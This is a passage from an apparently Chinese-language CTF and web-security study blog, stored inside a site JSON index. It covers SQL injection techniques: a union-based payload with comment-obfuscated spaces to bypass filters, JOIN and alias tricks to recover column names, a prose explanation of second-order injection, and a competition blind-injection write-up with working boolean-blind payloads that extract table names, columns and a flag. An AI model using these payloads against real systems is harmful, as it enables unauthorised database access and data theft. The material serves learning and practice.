0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2, (select&#x2F;**&#x2F;group_concat(&#96;3&#96;)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#39;1&#39;&#x3D;&#39;1 如果反引号被过滤，就要对字段利用别名替代 还可以利用join爆列名 join后的列名是两个表列名加起来的，可能会产⽣相同的列名，如id和name，使⽤别名时，表中不能出现同的字段名，这就跟join第⼀个特点相冲突，所以在join和别名同时使⽤时会导致报错 当通过查询得到新的表时，必须有一个别名，即每个派生出来的表都必须有一个自己的别名 二次注入原理 二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。 二次注入，可以概括为以下两步: 第一步：插入恶意数据 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。 第二步：引用恶意数据 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。 记考核赛的一次sql盲注 (strcmp(ascii(substr(REVERSE(tceles)(table_name)from(mysql.innodb_table_stats)where((table_schema)like(database())),1,1)),10000))%23 ||strcmp(ascii(substr((select(table_name)from(mysql.innodb_table_stats))where((database_name)like(database())),1,1)),1)%23 username=admin&amp;password=||((ascii(mid((pwd)from(1))))like(12))%23 YouAresOgOoD select(table_name)from(information_schema.tables)where(table_schema=database()) ||(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),§1§,1))=§0§)%23 flag_1s_her3 ||(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f31735f68657233)),§1§,1))=§0§)%23 flag{sql1_1s_s0_ea3y}","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"sql注入","slug":"sql注入","permalink":"https://ethe448.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]}],"categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://ethe448.github.io/tags/web/"},{"name":"华为ict","slug":"华为ict","permalink":"https://ethe448.github.io/tags/%E5%8D%8E%E4%B8%BAict/"},{"name":"随笔","slug":"随笔","permalink":"https://ethe448.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"反序列化","slug":"反序列化","permalink":"https://ethe448.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"ssti注入","slug":"ssti注入","permalink":"https://ethe448.github.io/tags/ssti%E6%B3%A8%E5%85%A5/"},{"name":"sql注入","slug":"sql注入","permalink":"https://ethe448.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]}